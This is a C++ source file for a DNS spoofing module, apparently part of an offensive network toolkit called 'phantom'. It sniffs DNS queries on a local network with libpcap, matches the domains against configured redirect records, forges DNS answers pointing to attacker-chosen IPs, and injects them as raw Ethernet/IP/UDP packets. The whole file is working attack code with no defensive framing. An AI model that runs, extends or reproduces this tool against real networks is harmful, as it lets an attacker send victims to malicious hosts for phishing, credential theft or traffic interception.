#include "dns_spoof.h"
#include "network.h"
#include "logger.h"
#include <cstring>
#include <random>
#include <algorithm>
#include <cctype>
#include <netinet/in.h>
#include <arpa/inet.h>

#if defined(__has_include)
#  if __has_include(<pcap/pcap.h>)
#    include <pcap/pcap.h>
#    define PHANTOM_HAS_PCAP 1
#  elif __has_include(<pcap.h>)
#    include <pcap.h>
#    define PHANTOM_HAS_PCAP 1
#  else
#    define PHANTOM_HAS_PCAP 0
#  endif
#else
#  define PHANTOM_HAS_PCAP 0
#endif

namespace phantom {

DnsSpoofer::DnsSpoofer() = default;
DnsSpoofer::~DnsSpoofer() { Stop(); }

void DnsSpoofer::SetInterface(const std::string& iface) { interface_ = iface; }
void DnsSpoofer::SetRedirectIp(const std::string& ip) { redirect_ip_ = ip; }

void DnsSpoofer::AddRecord(const std::string& domain, const std::string& redirect_ip) {
    std::string lower = domain;
    std::transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c) {
        return static_cast<char>(std::tolower(c));
    });
    records_[lower] = redirect_ip;
}

void DnsSpoofer::SetCallback(
    std::function<void(const std::string&, const std::string&, const std::string&)> cb) {
    callback_ = std::move(cb);
}

std::string DnsSpoofer::ExtractDomainName(const uint8_t* data, size_t offset,
                                             size_t total_len) {
    std::string domain;
    size_t pos = offset;
    while (pos < total_len && data[pos] != 0) {
        uint8_t label_len = data[pos];
        if (label_len == 0) break;
        if ((label_len & 0xC0) == 0xC0) {
            if (pos + 1 >= total_len) break;
            uint16_t ptr = ((label_len & 0x3F) << 8) | data[pos + 1];
            if (ptr < total_len) {
                std::string compressed = ExtractDomainName(data, ptr, total_len);
                if (!domain.empty() && !compressed.empty()) domain += ".";
                domain += compressed;
            }
            break;
        }
        pos++;
        if (pos + label_len > total_len) break;
        if (!domain.empty()) domain += ".";
        domain.append(reinterpret_cast<const char*>(data + pos), label_len);
        pos += label_len;
    }
    return domain;
}

std::vector<uint8_t> DnsSpoofer::BuildDnsResponse(const DnsHeader& orig_header,
                                                     const std::string& domain,
                                                     const std::string& redirect_ip) {
    std::vector<uint8_t> response;

    DnsHeader resp_hdr = orig_header;
    resp_hdr.flags = htons(0x8180);
    resp_hdr.an_count = htons(1);
    resp_hdr.ns_count = 0;
    resp_hdr.ar_count = 0;

    response.insert(response.end(), reinterpret_cast<uint8_t*>(&resp_hdr),
                    reinterpret_cast<uint8_t*>(&resp_hdr) + sizeof(DnsHeader));

    size_t pos = 0;
    std::string remaining = domain;
    while (!remaining.empty()) {
        size_t dot = remaining.find('.');
        std::string label = (dot != std::string::npos) ? remaining.substr(0, dot) : remaining;
        response.push_back((uint8_t)label.size());
        response.insert(response.end(), label.begin(), label.end());
        if (dot != std::string::npos) {
            remaining = remaining.substr(dot + 1);
        } else {
            remaining.clear();
        }
    }
    response.push_back(0);
    response.push_back(0); response.push_back(1);
    response.push_back(0); response.push_back(1);

    response.push_back(0xC0); response.push_back(0x0C);
    response.push_back(0); response.push_back(1);
    response.push_back(0); response.push_back(1);
    response.push_back(0); response.push_back(0);
    response.push_back(0); response.push_back(0x3C);
    response.push_back(0); response.push_back(4);

    uint32_t ip_addr = 0;
    auto ip_parts = IPv4Address::FromString(redirect_ip);
    memcpy(&ip_addr, &ip_parts.addr, 4);

    if (ip_addr == 0) {
        unsigned int a, b, c, d;
        if (sscanf(redirect_ip.c_str(), "%u.%u.%u.%u", &a, &b, &c, &d) == 4) {
            ip_addr = (d << 24) | (c << 16) | (b << 8) | a;
        }
    }

    response.push_back((ip_addr >> 0) & 0xFF);
    response.push_back((ip_addr >> 8) & 0xFF);
    response.push_back((ip_addr >> 16) & 0xFF);
    response.push_back((ip_addr >> 24) & 0xFF);

    return response;
}

uint16_t DnsSpoofer::RandomId() {
    static std::mt19937 rng(std::random_device{}());
    static std::uniform_int_distribution<uint16_t> dist(1, 65535);
    return dist(rng);
}

bool DnsSpoofer::ParseAndRespond(const uint8_t* data, size_t len,
                                   const std::string& client_ip) {
    if (len < sizeof(DnsHeader) + 5) return false;

    DnsHeader hdr;
    memcpy(&hdr, data, sizeof(DnsHeader));
    hdr.id = ntohs(hdr.id);
    hdr.flags = ntohs(hdr.flags);
    hdr.qd_count = ntohs(hdr.qd_count);

    if ((hdr.flags & 0x8000) != 0) return false;
    if (hdr.qd_count < 1) return false;

    std::string domain = ExtractDomainName(data, sizeof(DnsHeader), len);
    if (domain.empty()) return false;

    std::string lower_domain = domain;
    std::transform(lower_domain.begin(), lower_domain.end(), lower_domain.begin(), [](unsigned char c) {
        return static_cast<char>(std::tolower(c));
    });

    std::string resolved_ip;
    for (const auto& [rec_domain, rec_ip] : records_) {
        if (lower_domain == rec_domain ||
            (lower_domain.size() > rec_domain.size() &&
             lower_domain.substr(lower_domain.size() - rec_domain.size() - 1) == "." + rec_domain)) {
            resolved_ip = rec_ip;
            break;
        }
    }

    if (resolved_ip.empty() && !redirect_ip_.empty()) {
        resolved_ip = redirect_ip_;
    }

    if (resolved_ip.empty()) return false;

    auto response = BuildDnsResponse(hdr, domain, resolved_ip);
    if (response.empty()) return false;

    auto local_mac = MacAddress::FromString(NetworkManager::GetLocalMac(interface_));
    auto client_mac = MacAddress::FromString(NetworkManager::ArpLookup(IPv4Address::FromString(client_ip)));
    auto local_ip = IPv4Address::FromString(NetworkManager::GetLocalIp());
    auto client_ip_addr = IPv4Address::FromString(client_ip);

    std::vector<uint8_t> packet;
    packet.insert(packet.end(), client_mac.bytes, client_mac.bytes + 6);
    packet.insert(packet.end(), local_mac.bytes, local_mac.bytes + 6);
    packet.push_back(0x08); packet.push_back(0x00);

    uint8_t ip_hdr[20] = {0};
    ip_hdr[0] = 0x45;
    ip_hdr[1] = 0x00;
    uint16_t total_len = htons(20 + 8 + (uint16_t)response.size());
    memcpy(ip_hdr + 2, &total_len, 2);
    ip_hdr[4] = 0x00; ip_hdr[5] = 0x01;
    ip_hdr[6] = 0x40; ip_hdr[7] = 0x00;
    ip_hdr[8] = 0x40;
    ip_hdr[9] = 0x11;
    ip_hdr[10] = 0x00; ip_hdr[11] = 0x00;
    memcpy(ip_hdr + 12, &local_ip.addr, 4);
    memcpy(ip_hdr + 16, &client_ip_addr.addr, 4);

    uint32_t sum = 0;
    for (int i = 0; i < 20; i += 2) {
        sum += (ip_hdr[i] << 8) | ip_hdr[i + 1];
    }
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    uint16_t ip_cksum = ~sum;
    memcpy(ip_hdr + 10, &ip_cksum, 2);

    packet.insert(packet.end(), ip_hdr, ip_hdr + 20);

    uint16_t src_port = htons(53);
    uint16_t dst_port = htons(12345);
    uint16_t udp_len = htons(8 + (uint16_t)response.size());
    uint16_t udp_cksum = 0;
    (void)udp_cksum;

    packet.push_back((src_port >> 8) & 0xFF); packet.push_back(src_port & 0xFF);
    packet.push_back((dst_port >> 8) & 0xFF); packet.push_back(dst_port & 0xFF);
    packet.push_back((udp_len >> 8) & 0xFF); packet.push_back(udp_len & 0xFF);
    packet.push_back(0x00); packet.push_back(0x00);
    packet.insert(packet.end(), response.begin(), response.end());

    NetworkManager::SendRawPacket(interface_, packet.data(), packet.size());
    if (callback_) callback_(domain, client_ip, resolved_ip);
    return true;
}

void DnsSpoofer::CaptureLoop() {
#if PHANTOM_HAS_PCAP
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface_.c_str(), 65535, 1, 100, errbuf);
    if (!handle) {
        LOG_ERROR("DNS spoofer: cannot open " + interface_ + ": " + errbuf);
        return;
    }

    struct bpf_program filter;
    std::string local_ip = NetworkManager::GetLocalIp();
    std::string filter_str = "udp port 53 and not src host " + local_ip;
    if (pcap_compile(handle, &filter, filter_str.c_str(), 1, 0) != 0) {
        LOG_ERROR("DNS spoofer: bad filter: " + std::string(pcap_geterr(handle)));
        pcap_close(handle);
        return;
    }
    pcap_setfilter(handle, &filter);

    LOG_SUCCESS("DNS spoofer listening on " + interface_ +
                " | Default redirect: " + (redirect_ip_.empty() ? "none" : redirect_ip_) +
                " | Custom records: " + std::to_string(records_.size()));

    struct pcap_pkthdr* header;
    const uint8_t* capture_data;

    while (running_) {
        int result = pcap_next_ex(handle, &header, &capture_data);
        if (result <= 0) continue;
        if (header->caplen < 42) continue;

        uint32_t client_ip_raw;
        memcpy(&client_ip_raw, capture_data + 26, 4);
        std::string client_ip = IPv4Address{client_ip_raw}.ToString();

        uint16_t client_port;
        memcpy(&client_port, capture_data + 34, 2);

        const uint8_t* dns_data = capture_data + 42;
        size_t dns_len = header->caplen - 42;
        if (dns_len < sizeof(DnsHeader)) continue;

        DnsHeader hdr;
        memcpy(&hdr, dns_data, sizeof(DnsHeader));
        hdr.id = ntohs(hdr.id);
        hdr.flags = ntohs(hdr.flags);
        hdr.qd_count = ntohs(hdr.qd_count);

        if ((hdr.flags & 0x8000) != 0) continue;
        if (hdr.qd_count < 1) continue;

        std::string domain = ExtractDomainName(dns_data, sizeof(DnsHeader), dns_len);
        if (domain.empty()) continue;

        std::string lower_domain = domain;
        std::transform(lower_domain.begin(), lower_domain.end(), lower_domain.begin(), [](unsigned char c) {
            return static_cast<char>(std::tolower(c));
        });

        std::string resolved_ip;
        for (const auto& [rec_domain, rec_ip] : records_) {
            if (lower_domain == rec_domain ||
                (lower_domain.size() > rec_domain.size() &&
                 lower_domain.substr(lower_domain.size() - rec_domain.size() - 1) == "." + rec_domain)) {
                resolved_ip = rec_ip;
                break;
            }
        }
        if (resolved_ip.empty() && !redirect_ip_.empty()) {
            resolved_ip = redirect_ip_;
        }
        if (resolved_ip.empty()) continue;

        auto response = BuildDnsResponse(hdr, domain, resolved_ip);
        if (response.empty()) continue;

        auto local_mac = MacAddress::FromString(NetworkManager::GetLocalMac(interface_));
        auto client_mac = MacAddress::FromString(NetworkManager::ArpLookup(IPv4Address::FromString(client_ip)));
        auto local_ip_addr = IPv4Address::FromString(local_ip);
        auto client_ip_addr = IPv4Address::FromString(client_ip);

        std::vector<uint8_t> packet;
        packet.insert(packet.end(), client_mac.bytes, client_mac.bytes + 6);
        packet.insert(packet.end(), local_mac.bytes, local_mac.bytes + 6);
        packet.push_back(0x08); packet.push_back(0x00);

        uint8_t ip_hdr[20] = {0};
        ip_hdr[0] = 0x45;
        uint16_t total_len = htons(20 + 8 + (uint16_t)response.size());
        memcpy(ip_hdr + 2, &total_len, 2);
        ip_hdr[6] = 0x40; ip_hdr[7] = 0x00;
        ip_hdr[8] = 0x40;
        ip_hdr[9] = 0x11;
        memcpy(ip_hdr + 12, &local_ip_addr.addr, 4);
        memcpy(ip_hdr + 16, &client_ip_addr.addr, 4);

        uint32_t sum = 0;
        for (int i = 0; i < 20; i += 2) {
            sum += (ip_hdr[i] << 8) | ip_hdr[i + 1];
        }
        while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
        uint16_t ip_cksum = ~sum;
        memcpy(ip_hdr + 10, &ip_cksum, 2);

        packet.insert(packet.end(), ip_hdr, ip_hdr + 20);

        uint16_t src_port_h = htons(53);
        uint16_t udp_len_h = htons(8 + (uint16_t)response.size());
        packet.push_back((src_port_h >> 8) & 0xFF); packet.push_back(src_port_h & 0xFF);
        packet.push_back((client_port >> 8) & 0xFF); packet.push_back(client_port & 0xFF);
        packet.push_back((udp_len_h >> 8) & 0xFF); packet.push_back(udp_len_h & 0xFF);
        packet.push_back(0x00); packet.push_back(0x00);

        packet.insert(packet.end(), response.begin(), response.end());
        NetworkManager::SendRawPacket(interface_, packet.data(), packet.size());

        if (callback_) callback_(domain, client_ip, resolved_ip);
    }

    pcap_freecode(&filter);
    pcap_close(handle);
#else
    LOG_WARN("DNS capture requested but libpcap is unavailable in this environment");
#endif
}

bool DnsSpoofer::Start() {
    if (running_) return true;
    if (interface_.empty()) {
        LOG_ERROR("No interface set for DNS spoofer");
        return false;
    }
    if (redirect_ip_.empty() && records_.empty()) {
        LOG_ERROR("No redirect IP or DNS records configured");
        return false;
    }

    running_ = true;
    thread_ = std::thread(&DnsSpoofer::CaptureLoop, this);
    return true;
}

void DnsSpoofer::Stop() {
    if (!running_) return;
    running_ = false;
    if (thread_.joinable()) thread_.join();
    LOG_INFO("DNS spoofer stopped");
}

} // namespace phantom
